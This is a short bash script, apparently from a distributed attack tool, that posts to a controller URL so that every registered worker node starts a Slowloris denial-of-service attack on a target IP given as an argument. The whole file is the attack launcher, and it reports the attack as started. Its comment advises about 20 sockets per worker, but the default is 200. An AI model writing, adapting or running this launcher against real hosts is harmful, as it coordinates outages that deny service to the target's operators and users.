#!/usr/bin/env bash
# Start a Slowloris DDoS with all registered workers attacking the target.
# Usage: ./ddos.sh <target_ip> [controller_url]
#
# NUM_SOCKETS: sockets per worker (keep low — victim backlog is 10, 20 is enough)

set -euo pipefail

TARGET=${1:?Usage: ./ddos.sh <target_ip> [controller_url]}
CONTROLLER=${2:-http://localhost:8000}
NUM_SOCKETS=${NUM_SOCKETS:-200}

echo "=== Slowloris DDoS on $TARGET ($NUM_SOCKETS sockets/worker) ==="
curl -sf -X POST "$CONTROLLER/ddos/$TARGET?num_sockets=$NUM_SOCKETS"
echo ""
echo "=== Attack started — check $CONTROLLER/status for node states ==="
